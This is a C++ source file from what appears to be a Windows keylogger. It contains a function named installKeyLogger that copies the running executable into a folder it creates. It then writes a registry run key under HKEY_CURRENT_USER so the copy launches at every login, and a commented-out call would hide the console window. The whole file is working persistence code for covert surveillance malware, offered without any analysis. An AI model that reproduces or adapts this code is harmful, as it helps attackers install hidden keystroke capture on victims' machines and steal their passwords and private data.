
#include "autorun.h"
#include "tools.h"

#include <windows.h>
#include <winreg.h>
#include <wchar.h>


namespace Autorun
{

bool RegStartup(PCWSTR pszAppName, PCWSTR pathToExe)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t counter = MAX_PATH*2;
    wchar_t szValue[counter] = {};

    wcsncpy(szValue, L"\"",counter);
    wcsncat(szValue, pathToExe, counter);
    wcsncat(szValue, L"\" ", counter);

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, WREG_PATH, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue)+1)*2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void installKeyLogger(void)
{
//    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::string path(TOOLS::GetOurPath(true));
    TOOLS::MkDir(path);
    char szPathToExe[MAX_PATH];
    GetModuleFileNameA(NULL, szPathToExe, MAX_PATH);
    std::string strPathToExe(szPathToExe);
    path += strPathToExe.substr(strPathToExe.rfind("\\") + 1);
    CopyFileA(szPathToExe,path.c_str(),false);
    wchar_t* wide_string = new wchar_t[ path.length() + 1 ];
    std::copy( path.begin(), path.end(), wide_string );
    wide_string[ path.length() ] = 0;
    RegStartup(PROGRAM_NAME,  wide_string);

}

}
